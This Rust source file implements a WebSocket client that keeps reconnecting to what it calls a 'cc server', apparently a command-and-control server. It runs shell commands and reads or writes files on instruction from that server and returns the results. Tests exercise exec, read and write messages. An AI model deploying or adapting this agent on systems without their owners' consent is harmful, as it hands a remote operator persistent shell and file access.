use chrono::Utc;
use futures_util::{SinkExt, StreamExt};
use log::{error, info};
use serde::{Deserialize, Serialize};
use serde_json::json;
use serde_json::Value;
use tokio::time::{sleep, Duration};
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use url::Url;

use crate::message::{handle_file_call, handle_shell_call};

#[derive(Deserialize)]
struct IncomingMessage {
    id: Option<String>,
    from: Option<String>,
    action: String,
    payload: serde_json::Value,
}

#[derive(Serialize)]
struct JsonRpcResponse {
    jsonrpc: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    err: Option<String>,
    result: Value,
    id: Option<Value>,
}

#[derive(Deserialize)]
struct JsonRpcPayload {
    method: String,
    params: Option<serde_json::Value>,
}

fn make_call_res(id: &Option<String>,from: &Option<String>, result: JsonRpcResponse) -> Option<String> {
    id.as_ref().map(|id_str| {
        let msg = json!({
            "id": id_str,
            "to": from,
            "action": "callback",
            "payload": result
        });
        msg.to_string()
    })
}
pub async fn connect_cc_server_forever(server_url: &str, client_id: &str) {
    // Split URL to extract base URL and token
    let (clean_url, token) = match server_url.split_once('?') {
        Some((base, query)) => (base.to_string(), query.to_string()),
        None => (server_url.to_string(), String::new()),
    };

    let mut is_logged = false;

    loop {
        let url_str = format!(
            "{}?id={}&t={}",
            clean_url,
            client_id,
            Utc::now().timestamp_millis()
        );

        let url = match Url::parse(&url_str) {
            Ok(u) => u,
            Err(e) => {
                error!("Invalid URL '{}': {}", url_str, e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[-] Connecting to {}", url);
        let ws_stream = match connect_async(url.clone()).await {
            Ok((stream, _)) => stream,
            Err(e) => {
                error!("[-] Connection error: {}", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[+] Connected to {}", url);

        let (mut write, mut read) = ws_stream.split();

        // Send login message if token exists
        if !token.is_empty() {
            let login_msg = json!({
                "action": "login",
                "payload": {
                    "token": token.replace("token=", "")
                }
            }).to_string();

            if let Err(e) = write.send(Message::Text(login_msg)).await {
                error!("Failed to send login message: {}", e);
                continue;
            }
        } else {
            is_logged = true;
        }

        loop {
            match read.next().await {
                Some(Ok(msg)) => {
                    match msg {
                        Message::Text(txt) => {
                            info!("Received text: {}", txt);

                            if let Ok(data) = serde_json::from_str::<Value>(&txt) {
                                let action = data.get("action").and_then(Value::as_str).unwrap_or("");

                                match action {
                                    "callback" => {
                                        // Handle callback messages
                                        // if let Some(id) = data.get("id").and_then(Value::as_str) {
                                        //     // Store in your MsgResult equivalent
                                        // }
                                    }
                                    "logged" => {
                                        is_logged = true;
                                    }
                                    "logout" => {
                                        error!("logout!!");
                                        // is_logged = false;
                                        break; // Will trigger reconnection
                                    }
                                    _ => {
                                        if is_logged {
                                            if let Err(e) = handle_msg(&txt, &mut write).await {
                                                error!("handle_msg error: {}", e);
                                                break;
                                            }
                                        }
                                    }
                                }
                            }

                            // // if let Err(e) = handle_msg(&txt, &mut write).await {
                            //     error!("handle_msg error: {}", e);
                            //     break; // 出错重连
                            // }
                        }
                        Message::Binary(bin) => {
                            info!("Received binary message ({} bytes)", bin.len());
                        }
                        Message::Close(frame) => {
                            if let Some(cf) = frame {
                                info!(
                                    "Connection closed with code: {}, reason: {}",
                                    cf.code, cf.reason
                                );
                            } else {
                                info!("Connection closed without close frame");
                            }
                            break;
                        }
                        Message::Ping(p) => {
                            if let Err(e) = write.send(Message::Pong(p)).await {
                                error!("Failed to send pong: {}", e);
                                break;
                            }
                        }
                        Message::Pong(_) => {}
                        _ => {}
                    }
                }
                Some(Err(e)) => {
                    error!("Error receiving message: {}", e);
                    break;
                }
                None => {
                    info!("Connection stream ended");
                    break;
                }
            }
        }
        is_logged = false;
        info!("[*] Connection closed, retrying in 5 seconds...");
        sleep(Duration::from_secs(5)).await;
    }
}

pub async fn handle_msg<S>(text: &str, ws_sender: &mut S) -> Result<(), Box<dyn std::error::Error>>
where
    S: futures_util::Sink<Message> + Unpin,
    <S as futures_util::Sink<Message>>::Error: std::error::Error + Send + Sync + 'static,
{
    let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
    match msg {
        Ok(incoming) => {
            if incoming.action == "shell" {
                let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                match rpc {
                    Ok(rpc_payload) => {
                        info!("Received shell method: {}", rpc_payload.method);
                        let (err, result) =
                            handle_shell_call(&rpc_payload.method, &rpc_payload.params);

                        let resp = JsonRpcResponse {
                            jsonrpc: "2.0".to_string(),
                            err,
                            result,
                            id: incoming.id.clone().map(serde_json::Value::String),
                        };

                        if let Some(reply) = make_call_res(&incoming.id, &incoming.from, resp) {
                            ws_sender.send(Message::Text(reply)).await?;
                        }
                    }
                    Err(e) => {
                        error!("Failed to parse JSON-RPC payload: {}", e);
                    }
                }
            } else if incoming.action == "file" {
                let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                match rpc {
                    Ok(rpc_payload) => {
                        info!("Received file method: {}", rpc_payload.method);
                        let (err, result) =
                            handle_file_call(&rpc_payload.method, &rpc_payload.params);

                        let resp = JsonRpcResponse {
                            jsonrpc: "2.0".to_string(),
                            err,
                            result,
                            id: incoming.id.clone().map(serde_json::Value::String),
                        };

                        if let Some(reply) = make_call_res(&incoming.id,&incoming.from, resp) {
                            ws_sender.send(Message::Text(reply)).await?;
                        }
                    }
                    Err(e) => {
                        error!("Failed to parse JSON-RPC payload: {}", e);
                    }
                }
            } else {
                info!("Unknown action: {}", incoming.action);
            }
        }
        Err(e) => {
            error!("Failed to parse incoming message JSON: {}", e);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::message::handle_file_call;
    #[test]
    fn test_shell_exec() {
        let text =
            r#"{"id":"1","action":"shell","payload":{"method":"exec","params":["lsw -alh"]}}"#;
        let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
        match msg {
            Ok(incoming) => {
                if incoming.action == "shell" {
                    let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                    match rpc {
                        Ok(rpc_payload) => {
                            println!("Received shell method: {}", rpc_payload.method);
                            let (err, result) =
                                handle_shell_call(&rpc_payload.method, &rpc_payload.params);
                            println!("res: {:?},{}", err, result);
                        }
                        Err(e) => {
                            println!("Failed to parse JSON-RPC payload: {}", e);
                        }
                    }
                } else {
                    println!("Unknown action: {}", incoming.action);
                }
            }
            Err(e) => {
                println!("Failed to parse incoming message JSON: {}", e);
            }
        }
    }
    #[test]
    fn test_file_read() {
        let text =
            r#"{"id":"1","action":"file","payload":{"method":"read","params":["/tmp/test.log"]}}"#;
        let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
        match msg {
            Ok(incoming) => {
                if incoming.action == "file" {
                    let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                    match rpc {
                        Ok(rpc_payload) => {
                            println!("Received file method: {}", rpc_payload.method);
                            let (err, result) =
                                handle_file_call(&rpc_payload.method, &rpc_payload.params);
                            println!("res: {:?},{}", err, result);
                        }
                        Err(e) => {
                            println!("Failed to parse JSON-RPC payload: {}", e);
                        }
                    }
                } else {
                    println!("Unknown action: {}", incoming.action);
                }
            }
            Err(e) => {
                println!("Failed to parse incoming message JSON: {}", e);
            }
        }
    }
    #[test]
    fn test_file_write() {
        let text = r#"{"id":"1","action":"file","payload":{"method":"write","params":["/tmp/test.log","test ss1 content"]}}"#;
        let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
        match msg {
            Ok(incoming) => {
                if incoming.action == "file" {
                    let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                    match rpc {
                        Ok(rpc_payload) => {
                            println!("Received file method: {}", rpc_payload.method);
                            let (err, result) =
                                handle_file_call(&rpc_payload.method, &rpc_payload.params);
                            println!("res: {:?},{}", err, result);
                        }
                        Err(e) => {
                            println!("Failed to parse JSON-RPC payload: {}", e);
                        }
                    }
                } else {
                    println!("Unknown action: {}", incoming.action);
                }
            }
            Err(e) => {
                println!("Failed to parse incoming message JSON: {}", e);
            }
        }
    }
}
